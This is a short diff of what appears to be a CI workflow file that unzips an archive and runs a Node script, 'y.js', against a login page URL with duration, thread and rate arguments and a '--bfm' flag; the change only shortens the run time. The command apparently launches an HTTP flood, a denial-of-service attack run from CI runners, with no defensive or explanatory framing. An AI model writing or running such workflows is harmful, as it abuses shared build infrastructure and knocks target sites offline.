@@ -36,7 +36,7 @@ jobs:
           unzip Fc-main.zip
           cd Fc-main
            
-          node y.js GET https://susstresser.click/panel/login.php 3600 4 90 --bfm --debug
+          node y.js GET https://susstresser.click/panel/login.php 1800 4 90 --bfm --debug
 
           
           
